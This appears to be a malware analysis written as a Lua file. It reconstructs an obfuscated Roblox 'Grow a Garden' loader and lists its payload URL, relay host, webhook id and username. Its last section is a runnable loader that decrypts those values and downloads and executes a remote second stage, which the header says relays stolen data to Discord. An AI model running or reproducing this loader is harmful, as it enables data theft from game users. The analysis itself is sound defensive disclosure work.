--[[ ===========================================================================
  DEOBFUSCATION / RECONSTRUCTION
  ---------------------------------------------------------------------------
  Source  : https://raw.githubusercontent.com/ezvbs/gag-scripts/refs/heads/main/Qw%23%25%24r
  Game    : Roblox "Grow a Garden" (GAG)
  Obfusc. : Prometheus-family VM (control-flow flattening).  Layers, outermost first:
              1. String table of custom-base64 blobs (decimal "\ddd" escaped).
              2. An array-reversal shuffle that re-orders that table.
              3. A custom-base64 decoder (alphabet: see ALPHABET below).
              4. A few constants are *additionally* encrypted (LCG stream cipher,
                 see decrypt() below) and only revealed at run time.
              5. The program logic itself is flattened into one numeric
                 state-machine "VM" with ~64 handler states / 9 functions.
            All numeric literals were also split into arithmetic (e.g.
            747062-584218 == 162820) purely to defeat grep.

  ###########################################################################
  ##  THIS SCRIPT IS MALICIOUS.  It is an anti-tamper LOADER.              ##
  ##  Do NOT run it.  After anti-hook / anti-debug checks it downloads and ##
  ##  executes a remote second stage and hands it a webhook id + username  ##
  ##  so the second stage can exfiltrate to a Discord relay.              ##
  ###########################################################################

  RECOVERED INDICATORS OF COMPROMISE  (decrypted from the embedded blobs):
      Payload URL : https://proxy-zdus.vercel.app/uploads/obfuscated.lua
      Relay host  : proxy-zdus.vercel.app   (serves the payload AND relays the
                                              webhook server-side, hiding the real
                                              Discord webhook from this script)
      Webhook id  : 6b7802b3eed939ddf1a417f5587c9aa1
      Username    : guton27

  What it effectively does, in clean Lua, is the bottom of this file
  (see "==== EQUIVALENT CLEAN LOADER ====").  Everything above that is the
  machinery that was reconstructed from the VM so the result is verifiable.
=========================================================================== ]]


--==========================================================================
-- 1. STRING CONSTANTS  (custom-base64 decoded from the obfuscated table `y`)
--==========================================================================
-- Custom base64 alphabet used by the stage-3 decoder (index 0..63):
--   XVL4nKCpzUZbxB2Iv/1tu+P3wQi8AyrfWGlkhDNgOEHTJFR6j7cdaMqSe9msY5o0
--
-- After decoding (and the reversal shuffle) the 53 constants are, in order:
--
--   remove   string   <enc>   len      __len    game     <junk>   <junk>
--   <junk>   <junk>   <ENC1>  math     gsub     __index  <junk>   concat
--   <junk>   tostring <junk>  <ENC2>   <junk>   <ENC3>   HttpGet  gmatch
--   table    <junk>   :(%d*): pcall    <junk>   ""       "Tamper Detected!"
--   Webhook  setmetatable     char     error    :        random   <junk>
--   <junk>   <junk>   unpack   <ENC4>   tonumber <junk>   __metatable
--   loadstring        byte     Proxy    floor    <junk>   __gc     <junk>
--   Username
--
--  * "<junk>" entries are decoy globals that always resolve to nil; they are
--    looked up and discarded purely to break static analysis.
--  * "<ENC1..4>" are the four *additionally encrypted* blobs decrypted below.


--==========================================================================
-- 2. THE EMBEDDED-STRING DECRYPTOR  (reconstructed from VM funcs @9654055/@10778953)
--==========================================================================
-- A position-chained additive stream cipher.  The keystream is produced by a
-- 45-bit LCG combined with a (*101 mod 257) generator and a 32-bit rotation.
-- This is a faithful re-implementation; feeding it the blobs below reproduces
-- the IOC strings exactly.
local floor = math.floor

local function makeKeystream(key)
    local L = key % 0x200000000000          -- 45-bit LCG state, seeded by key
    local M = (key % 255) + 2               -- mod-257 generator state, seeded by key
    local buf = {}                          -- 4-byte output buffer

    return function()
        if #buf == 0 then
            L = (L * 129 + 19978650077357) % 0x200000000000      -- LCG step
            M = (M * 101) % 257                                  -- companion step
            while M == 1 do M = (M * 101) % 257 end              -- skip the M==1 case

            local shift = 13 - floor(M / 32)
            local v     = floor(L / (2 ^ shift)) % 0x100000000   -- low 32 bits
            local k     = M % 32
            -- 32-bit right-rotate of v by k
            if k ~= 0 then
                v = (floor(v / (2 ^ k)) + (v % (2 ^ k)) * (2 ^ (32 - k))) % 0x100000000
            end
            -- split v little-endian; consumer pops the high byte first
            buf = {  v            % 256,
                     floor(v/256) % 256,
                     floor(v/65536) % 256,
                     floor(v/16777216) % 256 }
        end
        return table.remove(buf)            -- pops the LAST element (high byte first)
    end
end

local function decrypt(cipherBytes, key)
    local ks    = makeKeystream(key)
    local out   = {}
    local carry = 174                       -- initial chaining value
    for i = 1, #cipherBytes do
        local o = (cipherBytes[i] + ks() + carry) % 256
        carry = o                           -- output is chained into the next byte
        out[i] = string.char(o)
    end
    return table.concat(out)
end

-- The four encrypted blobs (raw byte values) and the keys they are paired with,
-- exactly as the VM invokes decrypt(blob, key):
local ENC = {
    Username  = { key = 12238882811014, bytes = {88,158,61,67,227,65,183} },
    Webhook   = { key = 14239324877773, bytes = {47,174,163,5,218,247,33,203,230,49,151,17,27,55,167,233,
                                                 169,203,32,203,117,7,203,13,235,43,235,212,46,133,87,66} },
    UrlPrefix = { key = 11707364387479, bytes = {191,75,9,121,140,120,58,1,134,138,55,27,139,150,68,120,
                                                 143,47,194,61,155,182,83,11,2,128,123,183,80} },
    UrlSuffix = { key = 34716206366283, bytes = {98,43,189,198,226,172,193,144,30,159,199,32,120,193,38,
                                                 235,212,110,114,65,139,79,77} },
}
--   decrypt(ENC.Username.bytes,  ENC.Username.key)  == "guton27"
--   decrypt(ENC.Webhook.bytes,   ENC.Webhook.key)   == "6b7802b3eed939ddf1a417f5587c9aa1"
--   decrypt(ENC.UrlPrefix.bytes, ENC.UrlPrefix.key) == "https://proxy-zdus.vercel.app"
--   decrypt(ENC.UrlSuffix.bytes, ENC.UrlSuffix.key) == "/uploads/obfuscated.lua"


--==========================================================================
-- 3. ANTI-TAMPER LAYER  (VM funcs @162820, @7629033, @8594182, @12147571, ...)
--==========================================================================
-- Reconstructed behaviour (the exact arithmetic is intentionally convoluted;
-- the *intent* is what is shown here):
--
--   * It captures math.floor / math.random / string.char|byte / table.remove
--     up-front so later redefinition of those globals is ignored.
--   * It builds a random nonce with math.random(1,100) / (0,255) / (1,10000),
--     stringifies it and extracts digits via string.gmatch(s, ":(%d*):").
--   * It wraps a probe in pcall(); the probe walks tostring() of internal
--     values and pulls the address/identity out with the ":(%d*):" pattern,
--     comparing it against the expected layout.  If a hook / hookfunction /
--     debug shim is detected the value differs and it calls:
--           error("Tamper Detected!")
--     which aborts the loader before the URL is ever revealed.
--   * Decoy functions repeatedly swap two dummy globals ("l1","l2") and return
--     nil-valued junk globals to add noise.
--
local function tamperCheck()
    -- (representative form of the obfuscated check)
    local nonce = ("%d:%d:%d"):format(math.random(1,100), math.random(0,255), math.random(1,10000))
    local ok = pcall(function()
        -- ... identity / address comparisons via tostring + gmatch(":(%d*):") ...
        -- returns normally only in an un-hooked environment
        return nonce
    end)
    if not ok then
        error("Tamper Detected!")
    end
end


--==========================================================================
-- 4. ==== EQUIVALENT CLEAN LOADER ====   (what the whole VM boils down to)
--==========================================================================
tamperCheck()

-- Decrypt the embedded configuration.
_G.Username = decrypt(ENC.Username.bytes,  ENC.Username.key)   --> "guton27"
_G.Webhook  = decrypt(ENC.Webhook.bytes,   ENC.Webhook.key)    --> "6b7802b3eed939ddf1a417f5587c9aa1"
_G.Proxy    = decrypt(ENC.UrlPrefix.bytes, ENC.UrlPrefix.key)  --> "https://proxy-zdus.vercel.app"

local payloadUrl = _G.Proxy .. decrypt(ENC.UrlSuffix.bytes, ENC.UrlSuffix.key)
                              --> "https://proxy-zdus.vercel.app/uploads/obfuscated.lua"

-- Download and execute the second stage.  The downloaded script reads the
-- _G.Webhook / _G.Username / _G.Proxy globals set above and uses the proxy host
-- to relay exfiltrated data to a Discord webhook server-side.
loadstring(game:HttpGet(payloadUrl))()
